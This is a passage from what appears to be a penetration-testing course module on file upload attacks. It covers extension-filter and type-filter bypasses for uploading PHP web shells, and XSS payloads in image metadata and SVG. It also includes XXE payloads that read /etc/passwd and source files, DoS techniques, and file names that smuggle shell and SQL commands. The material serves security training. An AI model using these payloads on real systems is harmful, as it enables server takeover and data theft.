+<p>We may use any of the above lists for our fuzzing scan. As we are testing a PHP application, we will download and use the above <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP</a> list. Then, from <code>Burp History</code>, we can locate our last request to <code>/upload.php</code>, right-click on it, and select <code>Send to Intruder</code>. From the <code>Positions</code> tab, we can <code>Clear</code> any automatically set positions, and then select the <code>.php</code> extension in <code>filename="HTB.php"</code> and click the <code>Add</code> button to add it as a fuzzing position:</p>
+<p><img src="storage\modules\136\file\_uploads\_burp\_fuzz\_extension.jpg" alt=""></p>
+<p>We'll keep the file content for this attack, as we are only interested in fuzzing file extensions. Finally, we can <code>Load</code> the PHP extensions list from above in the <code>Payloads</code> tab under <code>Payload Options</code>. We will also un-tick the <code>URL Encoding</code> option to avoid encoding the (<code>.</code>) before the file extension. Once this is done, we can click on <code>Start Attack</code> to start fuzzing for file extensions that are not blacklisted:</p>
+<p><img src="storage\modules\136\file\_uploads\_burp\_intruder\_result.jpg" alt=""></p>
+<p>We can sort the results by <code>Length</code>, and we will see that all requests with the Content-Length (<code>193</code>) passed the extension validation, as they all responded with <code>File successfully uploaded</code>. In contrast, the rest responded with an error message saying <code>Extension not allowed</code>.</p>
+<hr>
+<h3 id="non-blacklisted-extensions">Non-Blacklisted Extensions</h3>
+<p>Now, we can try uploading a file using any of the <code>allowed extensions</code> from above, and some of them may allow us to execute PHP code. <code>Not all extensions will work with all web server configurations</code>, so we may need to try several extensions to get one that successfully executes PHP code.</p>
+<p>Let's use the <code>.phtml</code> extension, which PHP web servers often allow for code execution rights. We can right-click on its request in the Intruder results and select <code>Send to Repeater</code>. Now, all we have to do is repeat what we have done in the previous two sections by changing the file name to use the <code>.phtml</code> extension and changing the content to that of a PHP web shell:</p>
+<p><img src="storage\modules\136\file\_uploads\_php5\_web\_shell.jpg" alt=""></p>
+<p>As we can see, our file seems to have indeed been uploaded. The final step is to visit our upload file, which should be under the image upload directory (<code>profile_images</code>), as we saw in the previous section. Then, we can test executing a command, which should confirm that we successfully bypassed the blacklist and uploaded our web shell:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell.jpg" alt=""></p>
+<ol>
+<li>\
+Page 6</li>
+<li>Whitelist Filters</li>
+</ol>
+<h2 id="whitelist-filters">Whitelist Filters</h2>
+<hr>
+<p>As discussed in the previous section, the other type of file extension validation is by utilizing a <code>whitelist of allowed file extensions</code>. A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.</p>
+<p>Still, there are different use cases for a blacklist and for a whitelist. A blacklist may be helpful in cases where the upload functionality needs to allow a wide variety of file types (e.g., File Manager), while a whitelist is usually only used with upload functionalities where only a few file types are allowed. Both may also be used in tandem.</p>
+<hr>
+<h3 id="whitelisting-extensions">Whitelisting Extensions</h3>
+<p>Let's start the exercise at the end of this section and attempt to upload an uncommon PHP extension, like <code>.phtml</code>, and see if we are still able to upload it as we did in the previous section:</p>
+<p><img src="storage\modules\136\file\_uploads\_whitelist\_message.jpg" alt=""></p>
+<p>We see that we get a message saying <code>Only images are allowed</code>, which may be more common in web apps than seeing a blocked extension type. However, error messages do not always reflect which form of validation is being utilized, so let's try to fuzz for allowed extensions as we did in the previous section, using the same wordlist that we used previously:</p>
+<p><img src="storage\modules\136\file\_uploads\_whitelist\_fuzz.jpg" alt=""></p>
+<p>We can see that all variations of PHP extensions are blocked (e.g. <code>php5</code>, <code>php7</code>, <code>phtml</code>). However, the wordlist we used also contained other 'malicious' extensions that were not blocked and were successfully uploaded. So, let's try to understand how we were able to upload these extensions and in which cases we may be able to utilize them to execute PHP code on the back-end server.</p>
+<p>The following is an example of a file extension whitelist test:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$fileName = basename($_FILES[<span class="hljs-string">"uploadFile"</span>][<span class="hljs-symbol">"name"</span>]);
+
+if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
+<span class="hljs-code">    echo "Only images are allowed";</span>
+<span class="hljs-code">    die();</span>
+}
+</code></pre>
+<p>We see that the script uses a Regular Expression (<code>regex</code>) to test whether the filename contains any whitelisted image extensions. The issue here lies within the <code>regex</code>, as it only checks whether the file name <code>contains</code> the extension and not if it actually <code>ends</code> with it. Many developers make such mistakes due to a weak understanding of regex patterns.</p>
+<p>So, let's see how we can bypass these tests to upload PHP scripts.</p>
+<hr>
+<h3 id="double-extensions">Double Extensions</h3>
+<p>The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through <code>Double Extensions</code>. For example, if the <code>.jpg</code> extension was allowed, we can add it in our uploaded file name and still end our filename with <code>.php</code> (e.g. <code>shell.jpg.php</code>), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.</p>
+<p>Exercise: Try to fuzz the upload form with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">This Wordlist</a> to find what extensions are whitelisted by the upload form.</p>
+<p>Let's intercept a normal upload request, and modify the file name to (<code>shell.jpg.php</code>), and modify its content to that of a web shell:</p>
+<p><img src="storage\modules\136\file\_uploads\_double\_ext\_request.jpg" alt=""></p>
+<p>Now, if we visit the uploaded file and try to send a command, we can see that it does indeed successfully execute system commands, meaning that the file we uploaded is a fully working PHP script:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell.jpg" alt=""></p>
+<p>However, this may not always work, as some web applications may use a strict <code>regex</code> pattern, as mentioned earlier, like the following:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^.*\.(jpg|jpeg|png|gif)$/'</span>, $fileName)) { <span class="hljs-params">...</span>SNIP<span class="hljs-params">...</span> }
+</code></pre>
+<p>This pattern should only consider the final file extension, as it uses (<code>^.*\.</code>) to match everything up to the last (<code>.</code>), and then uses (<code>$</code>) at the end to only match extensions that end the file name. So, the <code>above attack would not work</code>. Nevertheless, some exploitation techniques may allow us to bypass this pattern, but most rely on misconfigurations or outdated systems.</p>
+<hr>
+<h3 id="reverse-double-extension">Reverse Double Extension</h3>
+<p>In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.</p>
+<p>For example, the <code>/etc/apache2/mods-enabled/php7.4.conf</code> for the <code>Apache2</code> web server may include the following configuration:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-section">&lt;FilesMatch ".+\.ph(ar|p|tml)"&gt;</span>
+    <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
+<span class="hljs-section">&lt;/FilesMatch&gt;</span>
+</code></pre>
+<p>The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches <code>.phar</code>, <code>.php</code>, and <code>.phtml</code>. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with (<code>$</code>). In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension. For example, the file name (<code>shell.php.jpg</code>) should pass the earlier whitelist test as it ends with (<code>.jpg</code>), and it would be able to execute PHP code due to the above misconfiguration, as it contains (<code>.php</code>) in its name.</p>
+<p>Exercise: The web application may still utilize a blacklist to deny requests containing <code>PHP</code> extensions. Try to fuzz the upload form with the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP Wordlist</a> to find what extensions are blacklisted by the upload form.</p>
+<p>Let's try to intercept a normal image upload request, and use the above file name to pass the strict whitelist test:</p>
+<p><img src="storage\modules\136\file\_uploads\_reverse\_double\_ext\_request.jpg" alt=""></p>
+<p>Now, we can visit the uploaded file, and attempt to execute a command:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell.jpg" alt=""></p>
+<p>As we can see, we successfully bypassed the strict whitelist test and exploited the web server misconfiguration to execute PHP code and gain control over the server.</p>
+<h3 id="character-injection">Character Injection</h3>
+<p>Finally, let's discuss another method of bypassing a whitelist validation test through <code>Character Injection</code>. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.</p>
+<p>The following are some of the characters we may try injecting:</p>
+<ul>
+<li><code>%20</code></li>
+<li><code>%0a</code></li>
+<li><code>%00</code></li>
+<li><code>%0d0a</code></li>
+<li><code>/</code></li>
+<li><code>.\</code></li>
+<li><code>.</code></li>
+<li><code>…</code></li>
+<li><code>:</code></li>
+</ul>
+<p>Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (<code>shell.php%00.jpg</code>) works with PHP servers with version <code>5.X</code> or earlier, as it causes the PHP web server to end the file name after the (<code>%00</code>), and store it as (<code>shell.php</code>), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (<code>:</code>) before the allowed file extension (e.g. <code>shell.aspx:.jpg</code>), which should also write the file as (<code>shell.aspx</code>). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.</p>
+<p>We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the <code>PHP</code> and <code>JPG</code> extensions, as follows:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-string">'%20'</span> <span class="hljs-string">'%0a'</span> <span class="hljs-string">'%00'</span> <span class="hljs-string">'%0d0a'</span> <span class="hljs-string">'/'</span> <span class="hljs-string">'.\\'</span> <span class="hljs-string">'.'</span> <span class="hljs-string">'…'</span> <span class="hljs-string">':'</span>; <span class="hljs-keyword">do</span>
+    <span class="hljs-keyword">for</span> ext <span class="hljs-keyword">in</span> <span class="hljs-string">'.php'</span> <span class="hljs-string">'.phps'</span>; <span class="hljs-keyword">do</span>
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"shell<span class="hljs-variable">$char</span><span class="hljs-variable">$ext</span>.jpg"</span> &gt;&gt; wordlist.txt
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"shell<span class="hljs-variable">$ext</span><span class="hljs-variable">$char</span>.jpg"</span> &gt;&gt; wordlist.txt
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"shell.jpg<span class="hljs-variable">$char</span><span class="hljs-variable">$ext</span>"</span> &gt;&gt; wordlist.txt
+        <span class="hljs-built_in">echo</span> <span class="hljs-string">"shell.jpg<span class="hljs-variable">$ext</span><span class="hljs-variable">$char</span>"</span> &gt;&gt; wordlist.txt
+    <span class="hljs-keyword">done</span>
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>With this custom wordlist, we can run a fuzzing scan with <code>Burp Intruder</code>, similar to the ones we did earlier. If either the back-end or the web server is outdated or has certain misconfigurations, some of the generated filenames may bypass the whitelist test and execute PHP code.</p>
+<p>Exercise: Try to add more PHP extensions to the above script to generate more filename permutations, then fuzz the upload functionality with the generated wordlist to see which of the generated file names can be uploaded, and which may execute PHP code after being uploaded.</p>
+<h2 id="type-filters">Type Filters</h2>
+<hr>
+<p>So far, we have only been dealing with type filters that only consider the file extension in the file name. However, as we saw in the previous section, we may still be able to gain control over the back-end server even with image extensions (e.g. <code>shell.php.jpg</code>). Furthermore, we may utilize some allowed extensions (e.g., SVG) to perform other attacks. All of this indicates that only testing the file extension is not enough to prevent file upload attacks.</p>
+<p>This is why many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type. While extension filters may accept several extensions, content filters usually specify a single category (e.g., images, videos, documents), which is why they do not typically use blacklists or whitelists. This is because web servers provide functions to check for the file content type, and it usually falls under a specific category.</p>
+<p>There are two common methods for validating the file content: <code>Content-Type Header</code> or <code>File Content</code>. Let's see how we can identify each filter and how to bypass both of them.</p>
+<hr>
+<h3 id="content-type">Content-Type</h3>
+<p>Let's start the exercise at the end of this section and attempt to upload a PHP script:</p>
+<p><img src="storage\modules\136\file\_uploads\_content\_type\_upload.jpg" alt=""></p>
+<p>We see that we get a message saying <code>Only images are allowed</code>. The error message persists, and our file fails to upload even if we try some of the tricks we learned in the previous sections. If we change the file name to <code>shell.jpg.phtml</code> or <code>shell.php.jpg</code>, or even if we use <code>shell.jpg</code> with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the <code>Content-Type Header</code> or the <code>File Content</code>.</p>
+<p>The following is an example of how a PHP web application tests the Content-Type header to validate the file type:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$<span class="hljs-keyword">type</span> = $_FILES[<span class="hljs-symbol">'uploadFile'</span>][<span class="hljs-symbol">'type'</span>];
+
+<span class="hljs-keyword">if</span> (!in_array($<span class="hljs-keyword">type</span>, <span class="hljs-built_in">array</span>(<span class="hljs-symbol">'image</span>/jpg', <span class="hljs-symbol">'image</span>/jpeg', <span class="hljs-symbol">'image</span>/png', <span class="hljs-symbol">'image</span>/gif'))) {
+    echo <span class="hljs-string">"Only images are allowed"</span>;
+    die<span class="hljs-literal">()</span>;
+}
+</code></pre>
+<p>The code sets the (<code>$type</code>) variable from the uploaded file's <code>Content-Type</code> header. Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since our browsers set this, this operation is a client-side operation, and we can manipulate it to change the perceived file type and potentially bypass the type filter.</p>
+<p>We may start by fuzzing the Content-Type header with SecLists' <a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">Content-Type Wordlist</a> through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to <code>45</code> types only (compared to around 700 originally). We can do so as follows:</p>
+<p>Type Filters</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wget https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>danielmiessler<span class="hljs-regexp">/SecLists/</span>master<span class="hljs-regexp">/Miscellaneous/</span>web/content-type.txt
+root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat content-type.txt | grep 'image/</span><span class="hljs-string">' &gt; image-content-types.txt</span>
+</code></pre>
+<p>Exercise: Try to run the above scan to find what Content-Types are allowed.</p>
+<p>For the sake of simplicity, let's just pick an image type (e.g. <code>image/jpg</code>), then intercept our upload request and change the Content-Type header to it:</p>
+<p><img src="storage\modules\136\file\_uploads\_bypass\_content\_type\_request.jpg" alt=""></p>
+<p>This time we get <code>File successfully uploaded</code>, and if we visit our file, we see that it was successfully uploaded:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell.jpg" alt=""></p>
+<p>Note: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as <code>POST</code> data), in which case we will need to modify the main Content-Type header.</p>
+<hr>
+<h3 id="mime-type">MIME-Type</h3>
+<p>The second and more common type of file content validation is testing the uploaded file's <code>MIME-Type</code>. <code>Multipurpose Internet Mail Extensions (MIME)</code> is an internet standard that determines the type of a file through its general format and bytes structure.</p>
+<p>This is usually done by inspecting the first few bytes of the file's content, which contain the <a href="https://en.wikipedia.org/wiki/List\_of\_file\_signatures">File Signature</a> or <a href="https://opensource.apple.com/source/file/file-23/file/magic/magic.mime">Magic Bytes</a>. For example, if a file starts with (<code>GIF87a</code> or <code>GIF89a</code>), this indicates that it is a <code>GIF</code> image, while a file starting with plaintext is usually considered a <code>Text</code> file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.</p>
+<p>Tip: Many other image types have non-printable bytes for their file signatures, while a <code>GIF</code> image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string <code>GIF8</code> is common between both GIF signatures, it is usually enough to imitate a GIF image.</p>
+<p>Let's take a basic example to demonstrate this. The <code>file</code> command on Unix systems finds the file type through the MIME type. If we create a basic file with text in it, it would be considered as a text file, as follows:</p>
+<p>Type Filters</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo <span class="hljs-string">"this is a text file"</span> &gt; <span class="hljs-keyword">text</span>.jpg 
+root@htb[/htb]$ <span class="hljs-keyword">file</span> <span class="hljs-keyword">text</span>.jpg 
+<span class="hljs-keyword">text</span>.jpg: ASCII <span class="hljs-keyword">text</span>
+</code></pre>
+<p>As we see, the file's MIME type is <code>ASCII text</code>, even though its extension is <code>.jpg</code>. However, if we write <code>GIF8</code> to the beginning of the file, it will be considered as a <code>GIF</code> image instead, even though its extension is still <code>.jpg</code>:</p>
+<p>Type Filters</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo <span class="hljs-string">"GIF8"</span> &gt; <span class="hljs-keyword">text</span>.jpg 
+root@htb[/htb]$file <span class="hljs-keyword">text</span>.jpg
+<span class="hljs-keyword">text</span>.jpg: GIF <span class="hljs-keyword">image</span> data
+</code></pre>
+<p>Web servers can also utilize this standard to determine file types, which is usually more accurate than testing the file extension. The following example shows how a PHP web application can test the MIME type of an uploaded file:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$<span class="hljs-keyword">type</span> = mime_content_type($_FILES[<span class="hljs-symbol">'uploadFile'</span>][<span class="hljs-symbol">'tmp_name'</span>]);
+
+<span class="hljs-keyword">if</span> (!in_array($<span class="hljs-keyword">type</span>, <span class="hljs-built_in">array</span>(<span class="hljs-symbol">'image</span>/jpg', <span class="hljs-symbol">'image</span>/jpeg', <span class="hljs-symbol">'image</span>/png', <span class="hljs-symbol">'image</span>/gif'))) {
+    echo <span class="hljs-string">"Only images are allowed"</span>;
+    die<span class="hljs-literal">()</span>;
+}
+</code></pre>
+<p>As we can see, the MIME types are similar to the ones found in the Content-Type headers, but their source is different, as PHP uses the <code>mime_content_type()</code> function to get a file's MIME type. Let's try to repeat our last attack, but now with an exercise that tests both the Content-Type header and the MIME type:</p>
+<p><img src="storage\modules\136\file\_uploads\_bypass\_content\_type\_request.jpg" alt=""></p>
+<p>Once we forward our request, we notice that we get the error message <code>Only images are allowed</code>. Now, let's try to add <code>GIF8</code> before our PHP code to try to imitate a GIF image while keeping our file extension as <code>.php</code>, so it would execute PHP code regardless:</p>
+<p><img src="storage\modules\136\file\_uploads\_bypass\_mime\_type\_request.jpg" alt=""></p>
+<p>This time we get <code>File successfully uploaded</code>, and our file is successfully uploaded to the server:</p>
+<p><img src="storage\modules\136\file\_uploads\_bypass\_mime\_type.jpg" alt=""></p>
+<p>We can now visit our uploaded file, and we will see that we can successfully execute system commands:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell\_gif.jpg" alt=""></p>
+<p>Note: We see that the command output starts with <code>GIF8</code> , as this was the first line in our PHP script to imitate the GIF magic bytes, and is now outputted as a plaintext before our PHP code is executed.</p>
+<p>We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an <code>Allowed MIME type with a disallowed Content-Type</code>, an <code>Allowed MIME/Content-Type with a disallowed extension</code>, or a <code>Disallowed MIME/Content-Type with an allowed extension</code>, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.</p>
+<h2 id="limited-file-uploads">Limited File Uploads</h2>
+<hr>
+<p>So far, we have been mainly dealing with filter bypasses to obtain arbitrary file uploads through a vulnerable web application, which is the main focus of this module at this level. While file upload forms with weak filters can be exploited to upload arbitrary files, some upload forms have secure filters that may not be exploitable with the techniques we discussed. However, even if we are dealing with a limited (i.e., non-arbitrary) file upload form, which only allows us to upload specific file types, we may still be able to perform some attacks on the web application.</p>
+<p>Certain file types, like <code>SVG</code>, <code>HTML</code>, <code>XML</code>, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.</p>
+<hr>
+<h3 id="xss">XSS</h3>
+<p>Many file types may allow us to introduce a <code>Stored XSS</code> vulnerability to the web application by uploading maliciously crafted versions of them.</p>
+<p>The most basic example is when a web application allows us to upload <code>HTML</code> files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.</p>
+<p>Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the <code>Comment</code> or <code>Artist</code> parameters, as follows:</p>
+<p>Limited File Uploads</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ exiftool -Comment=<span class="hljs-string">' "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;'</span> HTB<span class="hljs-selector-class">.jpg</span>
+root@htb[/htb]$ exiftool HTB<span class="hljs-selector-class">.jpg</span>
+..<span class="hljs-selector-class">.SNIP</span>...
+Comment                         :  <span class="hljs-string">"&gt;&lt;img src=1 onerror=alert(window.origin)&gt;</span>
+</code></pre>
+<p>We can see that the <code>Comment</code> parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to <code>text/html</code>, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.</p>
+<p>Finally, XSS attacks can also be carried with <code>SVG</code> images, along with several other attacks. <code>Scalable Vector Graphics (SVG)</code> images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to <code>HTB.svg</code>:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"1"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">rect</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"green"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"black"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">window</span>.origin);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+</code></pre>
+<p>Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.</p>
+<p>For more about XSS, you may refer to the <a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a> module.</p>
+<p>Exercise: Try the above attacks with the exercise at the end of this section, and see whether the XSS payload gets triggered and displays the alert.</p>
+<hr>
+<h3 id="xxe">XXE</h3>
+<p>Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (<code>/etc/passwd</code>):</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+</code></pre>
+<p>Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (<code>/etc/passwd</code>) printed on the page or shown in the page source. Similarly, if the web application allows the upload of <code>XML</code> documents, then the same payload can carry the same attack when the XML data is displayed on the web application.</p>
+<p>While reading systems files like <code>/etc/passwd</code> can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to <code>locate the upload directory, identify allowed extensions, or find the file naming scheme</code>, which may become handy for further exploitation.</p>
+<p>To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+</code></pre>
+<p>Once the SVG image is displayed, we should get the base64 encoded content of <code>index.php</code>, which we can decode to read the source code. For more about XXE, you may refer to the <a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a> module.</p>
+<p>Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like <code>PDF</code>, <code>Word Documents</code>, <code>PowerPoint Documents</code>, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web application used a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we may also modify their XML data to include the malicious XXE elements, and we would be able to carry a blind XXE attack on the back-end web server.</p>
+<p>Another similar attack that is also achievable through these file types is an SSRF attack. We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions. For more about SSRF, you may refer to the <a href="https://academy.hackthebox.com/module/details/145">Server-side Attacks</a> module.</p>
+<hr>
+<h3 id="dos">DoS</h3>
+<p>Finally, many file upload vulnerabilities may lead to a <code>Denial of Service (DOS)</code> attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the <a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a> module.</p>
+<p>Furthermore, we can utilize a <code>Decompression Bomb</code> with file types that use data compression, like <code>ZIP</code> archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.</p>
+<p>Another possible DoS attack is a <code>Pixel Flood</code> attack with some image files that utilize image compression, like <code>JPG</code> or <code>PNG</code>. We can create any <code>JPG</code> image file with any image size (e.g. <code>500x500</code>), and then manually modify its compression data to say it has a size of (<code>0xffff x 0xffff</code>), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.</p>
+<p>In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.</p>
+<p>If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. <code>../../../etc/passwd</code>), which may also cause the server to crash. <code>Try to search for other examples of DOS attacks through a vulnerable file upload functionality</code>.</p>
+<h2 id="other-upload-attacks">Other Upload Attacks</h2>
+<hr>
+<p>In addition to arbitrary file uploads and limited file upload attacks, there are a few other techniques and attacks worth mentioning, as they may become handy in some web penetration tests or bug bounty tests. Let's discuss some of these techniques and when we may use them.</p>
+<hr>
+<h3 id="injections-in-file-name">Injections in File Name</h3>
+<p>A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.</p>
+<p>For example, if we name a file <code>file$(whoami).jpg</code> or <code>file`whoami`.jpg</code> or <code>file.jpg||whoami</code>, and then the web application attempts to move the uploaded file with an OS command (e.g. <code>mv file /tmp</code>), then our file name would inject the <code>whoami</code> command, which would get executed, leading to remote code execution. You may refer to the <a href="https://academy.hackthebox.com/module/details/109">Command Injections</a> module for more information.</p>
+<p>Similarly, we may use an XSS payload in the file name (e.g. <code>&lt;script&gt;alert(window.origin);&lt;/script&gt;</code>), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. <code>file';select+sleep(5);--.jpg</code>), which may lead to an SQL injection if the file name is insecurely used in an SQL query.</p>
+<hr>
+<h3 id="upload-directory-disclosure">Upload Directory Disclosure</h3>
+<p>In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section. Furthermore, the <a href="https://academy.hackthebox.com/module/details/134">Web Attacks/IDOR</a> module discusses various methods of finding where files may be stored and identifying the file naming scheme.</p>
